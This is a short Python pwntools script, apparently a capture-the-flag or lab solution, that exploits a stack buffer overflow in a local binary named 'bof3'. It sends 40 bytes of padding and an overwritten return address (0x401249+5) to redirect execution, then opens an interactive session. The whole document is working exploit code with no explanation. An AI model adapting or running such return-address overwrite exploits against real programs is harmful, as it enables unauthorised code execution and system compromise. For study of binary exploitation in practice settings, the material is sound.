from pwn import *

exe = ELF('bof3')
p = process('./bof3')
input()
payload = b'a'*40 + p64(0x401249 + 5)

p.sendafter(b'> ', payload)
p.interactive()
